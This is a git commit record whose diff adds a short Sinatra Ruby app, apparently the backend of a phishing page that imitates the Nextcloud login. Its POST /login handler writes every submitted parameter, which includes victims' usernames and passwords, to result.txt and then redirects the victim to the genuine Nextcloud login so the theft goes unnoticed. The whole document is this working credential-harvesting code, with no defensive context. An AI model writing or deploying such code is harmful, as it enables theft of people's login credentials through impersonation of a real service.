fe0415f1fd85fc8bac4c823f8e2b0e8840949abd
Ubuntu <ubuntu@ip-172-31-19-44.eu-central-1.compute.internal>
2023-04-25 10:16:41 +0000

    initial commit

---
+++ app.rb
@@ -0,0 +1,7 @@
+require 'sinatra'
+post '/login' do
+  open('result.txt', 'a') do |f|
+    f << "== #{Time.now}, params:#{params.inspect} \r\n"
+  end
+  redirect "https://projects.nextcloud.com/login"
+end
